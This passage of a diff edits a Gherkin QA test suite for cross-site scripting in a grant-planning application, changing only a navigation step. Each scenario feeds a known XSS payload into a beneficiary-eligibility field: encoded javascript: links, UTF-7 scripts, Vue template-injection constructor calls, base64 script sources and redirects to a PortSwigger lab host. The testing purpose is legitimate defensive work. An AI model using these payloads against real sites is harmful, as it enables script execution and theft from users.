       | <form action="http://subdomain1.portswigger-labs.net/xss/xss.php" target="alert(1)"><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" value="XSS via target in a form"></form> | fieldBeneficiaryEligibility__c |
@@ -4900,7 +4900,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                                                                                            | Field                          |
       | <form><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type submit"></form> | fieldBeneficiaryEligibility__c |
@@ -4925,7 +4925,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                                                                                                                      | Field                          |
       | <form><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input name=1 type="image" src="validimage.png" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type image"></form> | fieldBeneficiaryEligibility__c |
@@ -4950,7 +4950,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                               | Field                          |
       | <meta http-equiv="refresh" content="0; url=//portswigger-labs.net"> | fieldBeneficiaryEligibility__c |
@@ -4975,7 +4975,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                              | Field                          |
       | <meta charset="UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4- | fieldBeneficiaryEligibility__c |
@@ -5000,7 +5000,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                           | Field                          |
       | <meta http-equiv="Content-Type" content="text/html; charset=UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4- | fieldBeneficiaryEligibility__c |
@@ -5025,7 +5025,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                         | Field                          |
       | +/v8+ADw-script+AD4-alert(1)+ADw-/script+AD4- | fieldBeneficiaryEligibility__c |
@@ -5050,7 +5050,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                         | Field                          |
       | +/v9+ADw-script+AD4-alert(1)+ADw-/script+AD4- | fieldBeneficiaryEligibility__c |
@@ -5075,7 +5075,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                         | Field                          |
       | +/v++ADw-script+AD4-alert(1)+ADw-/script+AD4- | fieldBeneficiaryEligibility__c |
@@ -5100,7 +5100,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                         | Field                          |
       | +/v/+ADw-script+AD4-alert(1)+ADw-/script+AD4- | fieldBeneficiaryEligibility__c |
@@ -5125,7 +5125,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                           | Field                          |
       | <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"> | fieldBeneficiaryEligibility__c |
@@ -5150,7 +5150,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                  | Field                          |
       | <iframe sandbox src="//portswigger-labs.net"></iframe> | fieldBeneficiaryEligibility__c |
@@ -5175,7 +5175,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                        | Field                          |
       | <meta name="referrer" content="no-referrer"> | fieldBeneficiaryEligibility__c |
@@ -5200,7 +5200,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                | Field                          |
       | %C0%BCscript>alert(1)</script> \n %E0%80%BCscript>alert(1)</script> \n %F0%80%80%BCscript>alert(1)</script> \n %F8%80%80%80%BCscript>alert(1)</script> \n %FC%80%80%80%80%BCscript>alert(1)</script> | fieldBeneficiaryEligibility__c |
@@ -5225,7 +5225,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                          | Field                          |
       | <script>\u0061lert(1)</script> | fieldBeneficiaryEligibility__c |
@@ -5250,7 +5250,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                          | Field                          |
       | <script>\u{61}lert(1)</script> | fieldBeneficiaryEligibility__c |
@@ -5275,7 +5275,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                  | Field                          |
       | <script>\u{0000000061}lert(1)</script> | fieldBeneficiaryEligibility__c |
@@ -5300,7 +5300,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                | Field                          |
       | <script>eval('\x61lert(1)')</script> | fieldBeneficiaryEligibility__c |
@@ -5325,7 +5325,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                               | Field                          |
       | <script>eval('\141lert(1)')</script> \n <script>eval('alert(\061)')</script> \n <script>eval('alert(\61)')</script> | fieldBeneficiaryEligibility__c |
@@ -5350,7 +5350,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                               | Field                          |
       | <a href="&#106;avascript:alert(1)">XSS</a><a href="&#106avascript:alert(1)">XSS</a> | fieldBeneficiaryEligibility__c |
@@ -5375,7 +5375,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                        | Field                          |
       | <svg><script>&#97;lert(1)</script></svg> \n <svg><script>&#x61;lert(1)</script></svg> \n <svg><script>alert&NewLine;(1)</script></svg> \n <svg><script>x="&quot;,alert(1)//";</script></svg> | fieldBeneficiaryEligibility__c |
@@ -5400,7 +5400,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                         | Field                          |
       | <a href="&#0000106avascript:alert(1)">XSS</a> | fieldBeneficiaryEligibility__c |
@@ -5425,7 +5425,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                      | Field                          |
       | <a href="&#x6a;avascript:alert(1)">XSS</a> | fieldBeneficiaryEligibility__c |
@@ -5450,7 +5450,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                        | Field                          |
       | <a href="j&#x61vascript:alert(1)">XSS</a><a href="&#x6aavascript:alert(1)">XSS</a><a href="&#x6a avascript:alert(1)">XSS</a> | fieldBeneficiaryEligibility__c |
@@ -5475,7 +5475,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                            | Field                          |
       | <a href="&#x0000006a;avascript:alert(1)">XSS</a> | fieldBeneficiaryEligibility__c |
@@ -5500,7 +5500,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                      | Field                          |
       | <a href="&#X6A;avascript:alert(1)">XSS</a> | fieldBeneficiaryEligibility__c |
@@ -5525,7 +5525,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                | Field                          |
       | <a href="javascript&colon;alert(1)">XSS</a> \n <a href="java&Tab;script:alert(1)">XSS</a> \n <a href="java&NewLine;script:alert(1)">XSS</a> \n <a href="javascript&colon;alert&lpar;1&rpar;">XSS</a> | fieldBeneficiaryEligibility__c |
@@ -5550,7 +5550,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                              | Field                          |
       | <a href="javascript:x='%27-alert(1)-%27';">XSS</a> | fieldBeneficiaryEligibility__c |
@@ -5575,7 +5575,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                     | Field                          |
       | <a href="javascript:x='&percnt;27-alert(1)-%27';">XSS</a> | fieldBeneficiaryEligibility__c |
@@ -5600,7 +5600,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                          | Field                          |
       | <script src=data:text/javascript;base64,YWxlcnQoMSk=></script> | fieldBeneficiaryEligibility__c |
@@ -5625,7 +5625,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                      | Field                          |
       | <script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script> | fieldBeneficiaryEligibility__c |
@@ -5650,7 +5650,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                  | Field                          |
       | <script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script> | fieldBeneficiaryEligibility__c |
@@ -5675,7 +5675,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                        | Field                          |
       | <iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe> | fieldBeneficiaryEligibility__c |
@@ -5700,7 +5700,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                                                                   | Field                          |
       | <iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"></iframe> | fieldBeneficiaryEligibility__c |
@@ -5725,7 +5725,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                               | Field                          |
       | <svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg> | fieldBeneficiaryEligibility__c |
@@ -5750,7 +5750,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                           | Field                          |
       | <img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`> | fieldBeneficiaryEligibility__c |
@@ -5775,7 +5775,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                     | Field                          |
       | {{constructor.constructor('alert(1)')()}} | fieldBeneficiaryEligibility__c |
@@ -5800,7 +5800,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                          | Field                          |
       | <div v-html="''.constructor.constructor('alert(1)')()">a</div> | fieldBeneficiaryEligibility__c |
@@ -5825,7 +5825,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                   | Field                          |
       | <x v-html=_c.constructor('alert(1)')()> | fieldBeneficiaryEligibility__c |
@@ -5850,7 +5850,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                 | Field                          |
       | <x v-if=_c.constructor('alert(1)')()> | fieldBeneficiaryEligibility__c |
@@ -5875,7 +5875,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                            | Field                          |
       | {{_c.constructor('alert(1)')()}} | fieldBeneficiaryEligibility__c |
@@ -5900,7 +5900,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                            | Field                          |
       | {{_v.constructor('alert(1)')()}} | fieldBeneficiaryEligibility__c |
@@ -5925,7 +5925,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                            | Field                          |
       | {{_s.constructor('alert(1)')()}} | fieldBeneficiaryEligibility__c |
@@ -5950,7 +5950,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                   | Field                          |
       | <p v-show="_c.constructor`alert(1)`()"> | fieldBeneficiaryEligibility__c |
@@ -5975,7 +5975,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                | Field                          |
       | <x v-on:click='_b.constructor`alert(1)`()'>click</x> | fieldBeneficiaryEligibility__c |
@@ -6000,7 +6000,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                     | Field                          |
       | <x v-bind:a='_b.constructor`alert(1)`()'> | fieldBeneficiaryEligibility__c |
@@ -6025,7 +6025,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                             | Field                          |
       | <x @[_b.constructor`alert(1)`()]> | fieldBeneficiaryEligibility__c |
@@ -6050,7 +6050,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                             | Field                          |
       | <x :[_b.constructor`alert(1)`()]> | fieldBeneficiaryEligibility__c |
@@ -6075,7 +6075,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                             | Field                          |
       | <p v-=_c.constructor`alert(1)`()> | fieldBeneficiaryEligibility__c |
@@ -6100,7 +6100,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                             | Field                          |
       | <x #[_c.constructor`alert(1)`()]> | fieldBeneficiaryEligibility__c |
@@ -6125,7 +6125,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                            | Field                          |
       | <p :=_c.constructor`alert(1)`()> | fieldBeneficiaryEligibility__c |
@@ -6150,7 +6150,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                            | Field                          |
       | {{_c.constructor('alert(1)')()}} | fieldBeneficiaryEligibility__c |
@@ -6175,7 +6175,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                          | Field                          |
       | {{_b.constructor`alert(1)`()}} | fieldBeneficiaryEligibility__c |
@@ -6200,7 +6200,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                    | Field                          |
       | <x v-bind:is="'script'" src="//14.rs" /> | fieldBeneficiaryEligibility__c |
@@ -6225,7 +6225,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                   | Field                          |
       | <x is=script src=//⑭.₨> | fieldBeneficiaryEligibility__c |
@@ -6250,7 +6250,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                            | Field                          |
       | <x @click='_b.constructor`alert(1)`()'>click</x> | fieldBeneficiaryEligibility__c |
@@ -6275,7 +6275,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                             | Field                          |
       | <x @[_b.constructor`alert(1)`()]> | fieldBeneficiaryEligibility__c |
@@ -6300,7 +6300,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                             | Field                          |
       | <x :[_b.constructor`alert(1)`()]> | fieldBeneficiaryEligibility__c |
@@ -6325,7 +6325,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                             | Field                          |
       | <x #[_c.constructor`alert(1)`()]> | fieldBeneficiaryEligibility__c |
@@ -6350,7 +6350,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                | Field                          |
       | <x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;"> | fieldBeneficiaryEligibility__c |
@@ -6375,7 +6375,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                     | Field                          |
       | <x title"="&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;"> | fieldBeneficiaryEligibility__c |
@@ -6400,7 +6400,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                           | Field                          |
       | <xyz<img/src onerror=alert(1)>> | fieldBeneficiaryEligibility__c |
@@ -6425,7 +6425,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                | Field                          |
       | <svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=setTimeout(/alert(1)/.source)&gt;</noscript></b></svg> | fieldBeneficiaryEligibility__c |
@@ -6450,7 +6450,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
